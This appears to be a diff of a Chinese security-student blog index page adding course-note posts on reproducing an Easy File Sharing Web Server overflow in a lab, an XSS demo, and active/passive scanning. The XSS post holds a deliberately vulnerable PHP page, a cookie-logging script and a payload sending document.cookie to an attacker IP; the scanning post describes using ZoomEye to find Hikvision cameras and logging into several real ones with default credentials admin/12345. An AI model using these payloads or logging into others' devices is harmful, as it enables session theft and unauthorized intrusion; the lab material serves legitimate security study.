@@ -202,7 +202,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://danggeovo.github.io/2023/03/29/%E4%BD%9C%E4%B8%9A3.2%20%E4%B8%BB%E5%8A%A8%E4%B8%8E%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/">
+    <link itemprop="mainEntityOfPage" href="https://danggeovo.github.io/2023/03/29/Easy%20File%20Sharing%20Web%20Server%20%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -220,7 +220,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/03/29/%E4%BD%9C%E4%B8%9A3.2%20%E4%B8%BB%E5%8A%A8%E4%B8%8E%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" class="post-title-link" itemprop="url">主动与被动扫描</a>
+          <a href="/2023/03/29/Easy%20File%20Sharing%20Web%20Server%20%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">Easy File Sharing Web Server 缓冲区溢出漏洞的简单复现</a>
         </h2>
 
         <div class="post-meta-container">
@@ -238,7 +238,334 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-08 18:02:12" itemprop="dateModified" datetime="2023-11-08T18:02:12+08:00">2023-11-08</time>
+      <time title="修改时间：2023-11-09 09:59:28" itemprop="dateModified" datetime="2023-11-09T09:59:28+08:00">2023-11-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E3%80%90-%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86-%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">【-专业知识-】渗透测试</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E3%80%90-%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86-%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%AF%BE%E7%A8%8B%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">课程记录</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>688</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.cnnvd.org.cn/web/index.html">http://www.cnnvd.org.cn/web/index.html</a>国家安全漏洞库可以查看这个漏洞</p>
+</blockquote>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095743577.png" alt="image-20231109095743577"><br>Easy File Sharing Web Server在处理用户请求时存在输入验证漏洞，远程攻击者可能利用此漏洞获取敏感信息。Easy File Sharing Web Server在上传文件时没有正确地过滤某些参数，允许用户通过目录遍历攻击向任意父目录上传文件。</p>
+<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><ul>
+<li><p><code>攻击机</code>:Kali-Linux2</p>
+</li>
+<li><p><code>靶机</code>: Windows7 旗舰版   </p>
+</li>
+<li><p><code>漏洞名称</code>：Easy File Sharing Web Server 缓冲区溢出漏洞</p>
+</li>
+</ul>
+<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="win7靶机的准备工作"><a href="#win7靶机的准备工作" class="headerlink" title="win7靶机的准备工作"></a>win7靶机的准备工作</h2><ol>
+<li><p>设置网络适配器，开启NAT模式。这样做的目的是使攻击机与靶机在同一个子网中。</p>
+</li>
+<li><p>查询靶机ip地址，便于扫描与设置<br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095757692.png" alt="image-20231109095757692"></p>
+</li>
+<li><p>开启服务，配置ip地址与端口<br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095809613.png" alt="image-20231109095809613"></p>
+</li>
+<li><p>漏洞测试</p>
+<blockquote>
+<p>进入80端口，并进行溢出测试</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095820983.png" alt="image-20231109095820983"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095831608.png" alt="image-20231109095831608"></p>
+<h2 id="攻击机准备工作"><a href="#攻击机准备工作" class="headerlink" title="攻击机准备工作"></a>攻击机准备工作</h2><ol>
+<li>扫描靶机ip，查看端口及服务<blockquote>
+<p>使用 <code>nmap -sV -p 80 [ip地址]</code>  查询80端口开启的服务</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095844007.png" alt="image-20231109095844007"><br><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062205799.png"></p>
+<p>发现win7靶机上已经运行此服务</p>
+<ol start="2">
+<li>漏洞利用<blockquote>
+<p>2.1 可以在<a href="www.exploit-db.com">www.exploit-db.com</a>查询此漏洞利用模块</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095859790.png" alt="image-20231109095859790"></p>
+<blockquote>
+<p>2.2 Kali Linux2系统自带的漏洞库，其中有exploit-db漏洞库的拷贝。使用<code>searchsploit</code>进行查询</p>
+</blockquote>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095911839.png" alt="image-20231109095911839"></p>
+<ol start="3">
+<li>执行脚本进行利用</li>
+</ol>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095923726.png" alt="image-20231109095923726"></p>
+<h1 id="收获与教训"><a href="#收获与教训" class="headerlink" title="收获与教训"></a>收获与教训</h1><h2 id="我的收获"><a href="#我的收获" class="headerlink" title="我的收获"></a>我的收获</h2><ul>
+<li>知道了几个漏洞查询的平台与kali中的查询方法</li>
+<li>安装了win7的虚拟机，可以用于以后的测试</li>
+<li>了解了漏洞利用的大体流程</li>
+<li>命令积累：</li>
+</ul>
+<ol>
+<li><code>netstat -参数</code>  查询开启端口与服务</li>
+<li><code>searchsploit 漏洞</code> 查询漏洞库</li>
+</ol>
+<h2 id="我的教训"><a href="#我的教训" class="headerlink" title="我的教训"></a>我的教训</h2><p>刚开始在win10物理机上进行测试，可以扫到端口与服务，但是无法利用成功，输入超字符也无法使服务崩溃。</p>
+<p>​      </p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://danggeovo.github.io/2023/03/29/xss%E5%B0%8F%E6%B5%8B%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="danggeOvO">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dangge の 小小世界">
+      <meta itemprop="description" content="记录生活与学习!">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | dangge の 小小世界">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/03/29/xss%E5%B0%8F%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">xss攻击测试</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-03-29 13:48:32" itemprop="dateCreated datePublished" datetime="2023-03-29T13:48:32+08:00">2023-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-11-09 09:54:56" itemprop="dateModified" datetime="2023-11-09T09:54:56+08:00">2023-11-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E3%80%90-%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86-%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">【-专业知识-】渗透测试</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E3%80%90-%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86-%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%AF%BE%E7%A8%8B%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">课程记录</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="概念辨析"><a href="#概念辨析" class="headerlink" title="概念辨析"></a>概念辨析</h1><h2 id="cookie？"><a href="#cookie？" class="headerlink" title="cookie？"></a>cookie？</h2><blockquote>
+<p>什么是cookie?其工作机制是什么？</p>
+</blockquote>
+<h4 id="什么是cookie"><a href="#什么是cookie" class="headerlink" title="什么是cookie?"></a>什么是cookie?</h4><p>在了解cookie之前，我们必须明确一个概念：即<code>HTTP协议本身是无状态</code>的，无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，这意味着当一个客户端向服务器端发出请求，然后Web服务器返回响应（Response），连接就被关闭了，在服务器端不保留连接的有关信息。也就是说，HTTP请求只能由客户端发起，而服务器不能主动向客户端发送数据。<br>而<code>cookie就是这个身份的证明</code>，实际上是一小段的文本信息（key-value格式）。<br>客户端向服务器发起请求，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。</p>
+<h4 id="cookie的工作机制？"><a href="#cookie的工作机制？" class="headerlink" title="cookie的工作机制？"></a>cookie的工作机制？</h4><blockquote>
+<p>当用户第一次访问并登陆一个网站的时候，cookie的设置以及发送会经历4个步骤：</p>
+</blockquote>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095310609.png" alt="image-20231109095310609"></p>
+<h2 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h2><h4 id="什么是xss攻击？"><a href="#什么是xss攻击？" class="headerlink" title="什么是xss攻击？"></a>什么是xss攻击？</h4><blockquote>
+<p>Cross Site Scripting  ,跨站脚本攻击。</p>
+<blockquote>
+<p>人们经常将跨站脚本攻击（Cross Site Scripting）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为XSS。</p>
+</blockquote>
+</blockquote>
+<p>跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者<code>嵌入恶意脚本代码</code>到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p>
+<p>XSS漏洞可以追溯到上世纪90年代。大量的网站曾遭受XSS漏洞攻击或被发现此类漏洞，如Twitter、Facebook、MySpace、Orkut、新浪微博和百度贴吧。研究表明，最近几年XSS已经超过缓冲区溢出成为最流行的攻击方式，有68%的网站可能遭受此类攻击。根据开放网页应用安全计划（Open Web Application Security Project）公布的2021年统计数据，在Web安全威胁前10位中，XSS并入代码注入（Injection），而注入威胁排在top10的第三位。</p>
+<h4 id="xss攻击的目的"><a href="#xss攻击的目的" class="headerlink" title="xss攻击的目的"></a>xss攻击的目的</h4><p>常用的XSS攻击手段和目的有：</p>
+<ol>
+<li>盗用cookie，获取敏感信息。</li>
+<li>利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</li>
+<li>利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li>
+<li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>
+<li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</li>
+</ol>
+<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p> <code>Website</code>：有XXS漏洞的合法网站,这里使用Kali-Linux2虚拟机作为网站服务器<br> <code>Website Visitor</code>：受害访问者，这里使用win10物理机进行代替<br> <code>Perptrator</code>：攻击者及数据接收网站。说明：将合法网站和攻击者接收网站都放在Kali虚拟机</p>
+<h2 id="使用脚本"><a href="#使用脚本" class="headerlink" title="使用脚本"></a>使用脚本</h2><blockquote>
+<p>对于website,使用submit.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;XSS Demo&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">    &lt;input style=<span class="string">&quot;width:300px;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;address1&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$_GET</span>[&quot;</span>address1<span class="string">&quot;]; ?&gt;&quot;</span> /&gt;</span><br><span class="line">            &lt;input type=“submit” value=“submit<span class="string">&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>对于Perptrator，使用hack.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$victim</span> = ‘XXS get the cookie:<span class="string">&#x27;. $_SERVER[&#x27;</span>REMOTE_ADDR<span class="string">&#x27;]. &#x27;</span>:<span class="string">&#x27; .$_GET[&#x27;</span>cookie<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">file_put_contents(‘1.txt&#x27;</span>, <span class="variable">$victim</span>);</span><br><span class="line"><span class="keyword">echo</span> welcome；</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>恶意payload:</p>
+</blockquote>
+<p><code>&quot;/&gt; &lt;script&gt;window.open(&quot;http://192.168.2.123/hack.php?cookie=&quot;+document.cookie);&lt;/script&gt;&lt;!-- </code></p>
+<h1 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h1><p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095330881.png" alt="image-20231109095330881"><br>这里把红蓝方合并，即既使用此虚拟机作为xss漏洞网站，有作为接收网站。</p>
+<h3 id="第一步-脚本部署"><a href="#第一步-脚本部署" class="headerlink" title="第一步 脚本部署"></a>第一步 脚本部署</h3><blockquote>
+<p>在虚拟机 &#x2F;var&#x2F;www&#x2F;html&#x2F;处进行部署，这里是apache服务的默认地址<br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095346309.png" alt="image-20231109095346309"></p>
+</blockquote>
+<h3 id="第二步-IP地址查询"><a href="#第二步-IP地址查询" class="headerlink" title="第二步 IP地址查询"></a>第二步 IP地址查询</h3><blockquote>
+<p>Kali使用ifconfig，win10 使用ipconfig进行查询。可知二者在一个子网。<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591494380.png" alt="Kali ip"><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095401520.png" alt="image-20231109095401520"></p>
+</blockquote>
+<h3 id="第三步-漏洞利用"><a href="#第三步-漏洞利用" class="headerlink" title="第三步 漏洞利用"></a>第三步 漏洞利用</h3><blockquote>
+<p>在Kali里进行网站的访问与恶意payload的输入</p>
+</blockquote>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095415939.png" alt="image-20231109095415939"></p>
+<h3 id="第四步-漏洞验证"><a href="#第四步-漏洞验证" class="headerlink" title="第四步 漏洞验证"></a>第四步 漏洞验证</h3><blockquote>
+<p>在win10 物理机进行访问，查看结果</p>
+</blockquote>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095438833.png" alt="image-20231109095438833"></p>
+<h1 id="实验收获"><a href="#实验收获" class="headerlink" title="实验收获"></a>实验收获</h1><ol>
+<li>了解了cookie的概念与原理</li>
+<li>知道了xss攻击的一些基本知识</li>
+<li>实际演示了一次xss攻击的流程，对漏洞存在者、漏洞利用者、受害者的关系有了清晰的理解。</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://danggeovo.github.io/2023/03/29/%E4%B8%BB%E5%8A%A8%E4%B8%8E%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="danggeOvO">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dangge の 小小世界">
+      <meta itemprop="description" content="记录生活与学习!">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | dangge の 小小世界">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/03/29/%E4%B8%BB%E5%8A%A8%E4%B8%8E%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" class="post-title-link" itemprop="url">主动与被动扫描</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-03-29 13:48:32" itemprop="dateCreated datePublished" datetime="2023-03-29T13:48:32+08:00">2023-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-11-09 10:00:57" itemprop="dateModified" datetime="2023-11-09T10:00:57+08:00">2023-11-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -323,11 +650,11 @@
 <h2 id="zoomeye的数据操作"><a href="#zoomeye的数据操作" class="headerlink" title="zoomeye的数据操作"></a>zoomeye的数据操作</h2><blockquote>
 <p>这里以海康威视的摄像头进行演示</p>
 </blockquote>
-<p><strong>第一步：打开zoomeye，并输入关键词DVRDVS-Webs进行检索</strong><br><img src="https://gitee.com/qidangge/picgo/raw/master/img/202110222252810.png" alt="第一步"></p>
-<p><strong>第二步：打开搜索到的地址</strong><br><img src="https://gitee.com/qidangge/picgo/raw/master/img/202110222223745.png" alt="第二步"><br>看你看见其ip地址</p>
-<p><strong>第三步：连接80端口</strong><br><img src="https://gitee.com/qidangge/picgo/raw/master/img/202110222223746.png" alt="第三步"><br>因为web服务的默认端口为80，所以打开后极有可能是登录界面</p>
-<p><strong>第四步：弱口令测试</strong><br><img src="https://gitee.com/qidangge/picgo/raw/master/img/202110222223747.png" alt="第四步"><br>一般海康威视的摄像头管理员：账号：admin  密码：12345。这里我们进行测试</p>
-<p><strong>第五步：是否成功？</strong><br><img src="https://gitee.com/qidangge/picgo/raw/master/img/202110252136825.png" alt="第五步"><br>在尝试的5、6个地址后成功以管理员身份登录。因为隐私保护，测试到此为止。</p>
+<p><strong>第一步：打开zoomeye，并输入关键词DVRDVS-Webs进行检索</strong><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095950716.png" alt="image-20231109095950716"></p>
+<p><strong>第二步：打开搜索到的地址</strong><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100001437.png" alt="image-20231109100001437"><br>看你看见其ip地址</p>
+<p><strong>第三步：连接80端口</strong><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100011514.png" alt="image-20231109100011514"><br>因为web服务的默认端口为80，所以打开后极有可能是登录界面</p>
+<p><strong>第四步：弱口令测试</strong><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100020560.png" alt="image-20231109100020560"><br>一般海康威视的摄像头管理员：账号：admin  密码：12345。这里我们进行测试</p>
+<p><strong>第五步：是否成功？</strong><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100033068.png" alt="image-20231109100033068"><br>在尝试的5、6个地址后成功以管理员身份登录。因为隐私保护，测试到此为止。</p>
 <h1 id="Nmap的讲解与实操"><a href="#Nmap的讲解与实操" class="headerlink" title="Nmap的讲解与实操"></a>Nmap的讲解与实操</h1><blockquote>
 <p>可以进行主动扫描的工具很多，但是最为优秀的一定是Nmap。</p>
 </blockquote>
@@ -347,7 +674,7 @@
 </blockquote>
 </li>
 </ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/img/202110231314400.png" alt="一个例子"><br>可以看见，通过nmap指令对目标进行扫描，可以得到以上信息。<br>在这些信息中我们要重点关注第6行及其之后的信息，那里显示了我们扫描的主机的端口状态及其开放情况。</p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100042809.png" alt="image-20231109100042809"><br>可以看见，通过nmap指令对目标进行扫描，可以得到以上信息。<br>在这些信息中我们要重点关注第6行及其之后的信息，那里显示了我们扫描的主机的端口状态及其开放情况。</p>
 <hr>
 <ol start="2">
 <li>对多个不连续的主机进行扫描<blockquote>
@@ -363,7 +690,7 @@
 </blockquote>
 </li>
 </ol>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/img/202110231328220.png" alt="连续扫描"></p>
+<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100051767.png" alt="image-20231109100051767"></p>
 <blockquote>
 <p>ps:可以通过添加<code>-sn</code>参数提高扫描速度，其作用是只扫描在线的主机。</p>
 </blockquote>
@@ -473,7 +800,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://danggeovo.github.io/2023/03/29/%E4%BD%9C%E4%B8%9A4.2%20Easy%20File%20Sharing%20Web%20Server%20%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/">
+    <link itemprop="mainEntityOfPage" href="https://danggeovo.github.io/2023/03/29/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -491,7 +818,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/03/29/%E4%BD%9C%E4%B8%9A4.2%20Easy%20File%20Sharing%20Web%20Server%20%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">Easy File Sharing Web Server 缓冲区溢出漏洞的简单复现</a>
+          <a href="/2023/03/29/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" class="post-title-link" itemprop="url">一句话木马</a>
         </h2>
 
         <div class="post-meta-container">
@@ -509,173 +836,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-08 18:02:30" itemprop="dateModified" datetime="2023-11-08T18:02:30+08:00">2023-11-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E3%80%90-%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86-%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">【-专业知识-】渗透测试</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E3%80%90-%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86-%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%AF%BE%E7%A8%8B%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">课程记录</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>688</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><blockquote>
-<p><a target="_blank" rel="noopener" href="http://www.cnnvd.org.cn/web/index.html">http://www.cnnvd.org.cn/web/index.html</a>国家安全漏洞库可以查看这个漏洞</p>
-</blockquote>
-<p><img src="https://gitee.com/qidangge/picgo/raw/master/img/202111062147883.png" alt="漏洞介绍"><br>Easy File Sharing Web Server在处理用户请求时存在输入验证漏洞，远程攻击者可能利用此漏洞获取敏感信息。Easy File Sharing Web Server在上传文件时没有正确地过滤某些参数，允许用户通过目录遍历攻击向任意父目录上传文件。</p>
-<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><ul>
-<li><p><code>攻击机</code>:Kali-Linux2</p>
-</li>
-<li><p><code>靶机</code>: Windows7 旗舰版   </p>
-</li>
-<li><p><code>漏洞名称</code>：Easy File Sharing Web Server 缓冲区溢出漏洞</p>
-</li>
-</ul>
